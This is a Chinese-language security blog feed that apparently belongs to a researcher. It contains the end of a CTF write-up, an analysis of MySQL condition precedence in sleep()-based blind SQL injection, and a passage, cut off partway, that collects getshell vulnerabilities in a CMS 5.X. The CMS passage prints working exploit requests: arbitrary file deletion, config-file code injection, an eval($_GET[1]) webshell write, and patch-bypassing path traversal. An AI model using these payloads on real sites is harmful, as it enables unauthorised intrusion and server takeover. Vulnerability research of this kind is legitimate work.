class="line">DDCTF&#123;afd18f4a112ca67951fc95afb92b74d8&#125;</span><br></pre></td></tr></table></figure><p>得到Flag；DDCTF{afd18f4a112ca67951fc95afb92b74d8}</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysql 执行优先级和sleep函数延时注入的一个Tip</title>
      <link href="/2018/03/13/Mysql_sleep/"/>
      <url>/2018/03/13/Mysql_sleep/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>代码审计发现了一个基于时间延迟的SQL盲注，但是发现 sleep(2)成功获取数据时页面返回时间均为4秒，即为设置时间的两倍，所以有了下面的分析。<br><a id="more"></a></p><h2 id="0x01Mysql-执行优先级和sleep函数"><a href="#0x01Mysql-执行优先级和sleep函数" class="headerlink" title="0x01Mysql 执行优先级和sleep函数"></a>0x01Mysql 执行优先级和sleep函数</h2><p>Mysql语句关于AND和OR执行优先级和Mysql查询优化策略有以下几点：</p><ul><li>AND的优先级大于OR，先计算AND的结果，再计算or的结果</li><li>同优先级AND中如果有恒为0(如and 1=2),则直接返回0，不执行同级中的其他语句</li><li>多个OR连接的语句中如果有恒为1(如or 1=1),则直接返回1，不执行的其他语句</li></ul><ol start="0"><li><p>首先测试数据表结构和数据如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|   1002 | test2    | test2     | 1    |</span><br><span class="line">|   1001 | test1    | test1     | 1    |</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where mood=sleep(1)，延时了3秒。<br>（没有限定条件，和数据表的每一条进行对比，进行了3次sleep(1)函数）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where mood=sleep(1) ;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where username=’test2’ and mood=sleep(1);延时1秒。<br>（先筛选username=’test2’，只有1条记录，进行了1次sleep(1)函数）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf where <span class="attribute">username</span>=<span class="string">'test2'</span> <span class="keyword">and</span> <span class="attribute">mood</span>=sleep(1);</span><br><span class="line">Empty <span class="builtin-name">set</span> (1.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行 select * from ctf where userid&gt;100 and mood=sleep(1);延时2秒。<br>（先筛选userid&gt;100，有2条记录，进行了2次sleep(1)函数）</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> ctf <span class="keyword">where</span> userid&gt;<span class="number">100</span> <span class="keyword">and</span> mood=sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>select * from ctf where userid&gt;100 and 1=2 and mood=sleep(1);没有延时直接返回空。（由于sleep之前有and 1=2,不可能成立，直接返回空，没有执行sleep(1)）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf where userid&gt;100 <span class="keyword">and</span> <span class="attribute">1</span>=2 <span class="keyword">and</span> <span class="attribute">mood</span>=sleep(1);</span><br><span class="line">Empty <span class="builtin-name">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where userid&gt;100 and 1=2 or mood=sleep(1);延时3秒<br>（根据优先级，先计算执行100 and 1=2,不可能成立，没有符合要求的数据记录，但是还需要判断or之后的条件，所以仍然要查询比对三次，执行3次sleep(1)）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where userid&gt;100 and 1=2 or mood=sleep(1);</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select <em> from ctf where userid&gt;100 and 1=sleep(1) or mood=0;延时2秒，执行select </em> from ctf where 1=sleep(1) and userid&gt;100 or mood=0;延时3秒，两者返回结果一致，但是由于执行顺序不同，导致延时不同。（前一种情况根据优先级，执行userid&gt;100 and 1=sleep(1)，通过userid&gt;100筛选只有两条记录，然后再sleep(1)，所以只延时2秒。后一种情况，根据优先级，执行1=sleep(1) and userid&gt;100，直接利用1=sleep(1)的条件和数据库记录对比以后，再判断userid&gt;100的条件，要全部比对执行三次，所以延时3秒。）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (2.00 sec)</span><br><span class="line">mysql&gt; select * from ctf where 1=sleep(1) and userid&gt;100 or mood=0;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0 or 1=1;延时0秒。<br>（userid&gt;100 and 1=sleep(1) or mood=0 or 1=1,在OR连接的语句中有恒成立的1=1，所以直接返回结果，没有延时。）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0 or 1=1;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|   1002 | test2    | test2     | 1    |</span><br><span class="line">|   1001 | test1    | test1     | 1    |</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x02小结"><a href="#0x02小结" class="headerlink" title="0x02小结"></a>0x02小结</h2><p>由于MySQL的条件优先级的不同，在不同语句中执行sleep()函数导致的延迟时间（执行次数）不同，一个比较简单的判断就是，判断sleep()函数所在的点，进行数据查询时需要对比的数据记录数，即等于sleep()函数执行的次数。</p>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某CMS5.X版本GETSHELL漏洞合集-五连杀</title>
      <link href="/2018/03/13/5_x_getshell/"/>
      <url>/2018/03/13/5_x_getshell/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首发于：<a href="https://xz.aliyun.com/t/2096" target="_blank" rel="noopener">先知社区: 某CMS 5.X版本GETSHELL漏洞合集</a><br>2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。<br><a id="more"></a></p><h2 id="0x01安装过程过滤不严导致Getshell"><a href="#0x01安装过程过滤不严导致Getshell" class="headerlink" title="0x01安装过程过滤不严导致Getshell"></a>0x01安装过程过滤不严导致Getshell</h2><p><em>前提:有删除/config/install.lock权限</em></p><h3 id="1-结合网上爆出某CMS-的后台任意文件删除漏洞"><a href="#1-结合网上爆出某CMS-的后台任意文件删除漏洞" class="headerlink" title="1. 结合网上爆出某CMS 的后台任意文件删除漏洞"></a>1. 结合网上爆出某CMS 的后台任意文件删除漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#/admin/app/batch/csvup.php</span></span><br><span class="line"></span><br><span class="line">$classflie=explode(<span class="string">'_'</span>,$fileField);</span><br><span class="line">$classflie=explode(<span class="string">'-'</span>,$classflie[count($classflie)<span class="number">-1</span>]);</span><br><span class="line">$class1=$classflie[<span class="number">0</span>];</span><br><span class="line">$class2=$classflie[<span class="number">1</span>];</span><br><span class="line">$class3=$classflie[<span class="number">2</span>];</span><br><span class="line">$class=$class3?$class3:($class2?$class2:$class1); </span><br><span class="line">$classcsv=$db-&gt;get_one(<span class="string">"select * from $met_column where id=$class"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$classcsv)&#123;</span><br><span class="line">metsave(<span class="string">"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang"</span>,$lang_csvnocolumn,$depth);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略代码</span></span><br><span class="line"></span><br><span class="line">@file_unlink($flienamecsv);</span><br></pre></td></tr></table></figure><p>删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/</span>app<span class="regexp">/batch/</span>csvup.php?fileField=<span class="number">1</span>_1231-<span class="number">1</span>&amp;flienamecsv=..<span class="regexp">/../</span>..<span class="regexp">/config/i</span>nstall.lock</span><br></pre></td></tr></table></figure></p><h3 id="2-重装时数据库配置文件过滤不当"><a href="#2-重装时数据库配置文件过滤不当" class="headerlink" title="2. 重装时数据库配置文件过滤不当"></a>2. 重装时数据库配置文件过滤不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'db_setup'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($setup==<span class="number">1</span>)&#123;</span><br><span class="line">            $db_prefix      = trim($db_prefix);</span><br><span class="line">            $db_host        = trim($db_host);</span><br><span class="line">            $db_username    = trim($db_username);</span><br><span class="line">            $db_pass        = trim($db_pass);</span><br><span class="line">            $db_name        = trim($db_name);</span><br><span class="line">            $config=<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">                   /*</span></span><br><span class="line"><span class="string">                   con_db_host = \"$db_host\"</span></span><br><span class="line"><span class="string">                   con_db_id   = \"$db_username\"</span></span><br><span class="line"><span class="string">                   con_db_pass    = \"$db_pass\"</span></span><br><span class="line"><span class="string">                   con_db_name = \"$db_name\"</span></span><br><span class="line"><span class="string">                   tablepre    =  \"$db_prefix\"</span></span><br><span class="line"><span class="string">                   db_charset  =  \"utf8\";</span></span><br><span class="line"><span class="string">                  */</span></span><br><span class="line"><span class="string">                  ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            $fp=fopen(<span class="string">"../config/config_db.php"</span>,<span class="string">'w+'</span>);</span><br><span class="line">            fputs($fp,$config);</span><br><span class="line">            fclose($fp);</span><br></pre></td></tr></table></figure><p>在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。</p><h3 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h3><p>数据库配置时修改任意参数为<code>*/phpinfo();/*</code>可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。<br>shell地址:<code>http://xxx.com/config/config_db.php</code></p><h2 id="0x02-iconv函数缺陷-条件竞争Getshell"><a href="#0x02-iconv函数缺陷-条件竞争Getshell" class="headerlink" title="0x02 iconv函数缺陷+条件竞争Getshell"></a>0x02 iconv函数缺陷+条件竞争Getshell</h2><p><em>前提:windows服务器+php版本&lt;5.4.0</em></p><h3 id="1-漏洞点"><a href="#1-漏洞点" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#\admin\app\batch\csv.php</span></span><br><span class="line"></span><br><span class="line">fputcsv($fp,$fristarray); </span><br><span class="line">fputcsv($fp,$csvarray); </span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sqlzip=<span class="string">'csv.zip'</span>;</span><br><span class="line">$archive = <span class="keyword">new</span> PclZip($sqlzip);</span><br><span class="line">$zip_list = $archive-&gt;create(<span class="string">"./$title.csv"</span>);</span><br><span class="line">$cont  = iconv($codeold,$codenew,<span class="string">"&#123;$lang_csvexplain1&#125;\r\n&#123;$lang_csvexplain2&#125;\r\n&#123;$lang_csvexplain3&#125;\r\n&#123;$lang_csvexplain4&#125;"</span>);</span><br><span class="line">$fp = fopen(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>),w);</span><br><span class="line">fputs($fp, $cont);</span><br><span class="line">fclose($fp);</span><br><span class="line">$zip_list = $archive-&gt;add(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>));</span><br><span class="line">@file_unlink(<span class="string">"./$title.csv"</span>);</span><br><span class="line">@file_unlink(iconv($codenew,$codeold,<span class="string">"./$title.csv"</span>));</span><br><span class="line">@file_unlink(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>));</span><br></pre></td></tr></table></figure><p>(1)文件名截断+任意内容写入</p><p>将lang_langshuom参数的值经过iconv转换后直接写文件，由于PHP版本&lt;5.4.0时,会忽略掉不认识的字符，所以可以控制文件名参数lang_langshuom生成php后缀文件，同时将lang_csvexplain1、lang_csvexplain2、lang_csvexplain3参数的内容写入文件，所以存在getshell的风险。</p><p>请求如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=tmp.php%80&amp;lang_csvexplain1=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>(2)条件竞争</p><p>然而由于@file_unlink(iconv($codeold,$codenew,”./{$lang_langshuom}.txt”));会删除生成的shell文件，不能手动getshell，再次分析源码发现，此处为生成了shell文件，然后再删除。所以只要在删除前请求shell生成其他文件即可，即利用条件竞争，生成持久性webshell,写脚本即可实现。</p><h3 id="2-POC脚本"><a href="#2-POC脚本" class="headerlink" title="2. POC脚本"></a>2. POC脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure><p>修改参数后执行效果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br><span class="line">shell @ http://127.0.0.1/某CMS 5.3.19//admin/app/batch/shell.php</span><br></pre></td></tr></table></figure></p><p>ps:<br>利用php特性可以不用条件竞争，直接getshell<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=1.php/.%80&amp;lang_csvexplain1=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-CVE-2017-11347补丁绕过继续Getshell"><a href="#0x03-CVE-2017-11347补丁绕过继续Getshell" class="headerlink" title="0x03 CVE-2017-11347补丁绕过继续Getshell"></a>0x03 CVE-2017-11347补丁绕过继续Getshell</h2><p><em>前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名）</em></p><h3 id="1-查找绝对路径的方法："><a href="#1-查找绝对路径的方法：" class="headerlink" title="1. 查找绝对路径的方法："></a>1. 查找绝对路径的方法：</h3><ul><li>利用安装目录下的phpinfo文件： <code>/install/phpinfo.php</code></li><li>利用报错信息(<strong>信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页</strong>)<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>admin/top.php</span><br><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>admin/box.php</span><br><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>web/sidebar.php</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>5.3.19版本针对CVE-2017-11347的补丁分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($val[<span class="number">2</span>])&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      $address=<span class="string">"../about/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      $address=<span class="string">"../news/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      $address=<span class="string">"../product/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      $address=<span class="string">"../download/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      $address=<span class="string">"../img/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      $address=<span class="string">"../feedback/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      $address = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line">   $newfile  =<span class="string">"../../../$val[1]"</span>; </span><br><span class="line">   <span class="keyword">if</span>($address != <span class="string">''</span>)&#123;</span><br><span class="line">      Copyfile($address,$newfile);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。</p><p>漏洞利用(网站安装在服务器根路径的情况)：</p><p>第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;<br>在后台”地址栏图标”处上传该文件。<br>得到地址为：<a href="http://localhost/upload/file/1506587082.ico" target="_blank" rel="noopener">http://localhost/upload/file/1506587082.ico</a></p><p>第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\u</span>pload<span class="symbol">\f</span>ile<span class="symbol">\1</span>506587082.ico/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\w</span>ww<span class="symbol">\a</span>bout<span class="symbol">\s</span>hell.php|1</span><br></pre></td></tr></table></figure></p><p>shell的地址为：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/about/</span>shell.php</span><br></pre></td></tr></table></figure></p><h3 id="3-POC-注意左斜杠和右斜杠不能随意更改-："><a href="#3-POC-注意左斜杠和右斜杠不能随意更改-：" class="headerlink" title="3. POC(注意左斜杠和右斜杠不能随意更改)："></a>3. POC(注意左斜杠和右斜杠不能随意更改)：</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\上</span>传ico文件的相对路径/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\网</span>站index.php路径的上一层目录名<span class="symbol">\a</span>bout<span class="symbol">\w</span>ebshell的文件名|1</span><br></pre></td></tr></table></figure><p>特别注意其中的：“网站index.php上层目录名”，</p><p>1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www”；网站index.php上层目录名设置为”www”;  如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为”html”;。其他的环境类推（利用绝对路径泄露）。</p><p>2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。</p><p>例如:网站搭建在:<a href="https://note.youdao.com/" target="_blank" rel="noopener">http://localhost/某CMS 5.3.19/</a>,则第二步的payload如下：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://localhost/某CMS 5.3.19/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\u</span>pload<span class="symbol">\f</span>ile<span class="symbol">\1</span>506588072.ico/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\某</span>CMS 5.3.19<span class="symbol">\a</span>bout<span class="symbol">\s</span>hell.php|1</span><br></pre></td></tr></table></figure></p><p>相应生成的shell地址为：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.19/</span>about<span class="regexp">/shell.php</span></span><br></pre></td></tr></table></figure></p><h2 id="0x04-Copyindx函数处理不当Getshell"><a href="#0x04-Copyindx函数处理不当Getshell" class="headerlink" title="0x04 Copyindx函数处理不当Getshell"></a>0x04 Copyindx函数处理不当Getshell</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p>此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347：<a href="https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下：" target="_blank" rel="noopener">https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下：</a></p><p>（1）触发函数是Copyindex函数，而非Copyfile</p><p>（2）此漏洞不是利用文件包含require_one，而是利用任意内容写入</p><p>（3）此漏洞Getshell不需要上传图片</p><p>（4）结合CSRF可以实现一键Getshell</p><h3 id="2-漏洞点"><a href="#2-漏洞点" class="headerlink" title="2. 漏洞点"></a>2. 漏洞点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin/app/physical/physical.php:197-236</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($op)&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">if</span>(is_dir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]))&#123;</span><br><span class="line">      deldir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">echo</span> $lang_physicaldelok;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;unlink(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">echo</span> 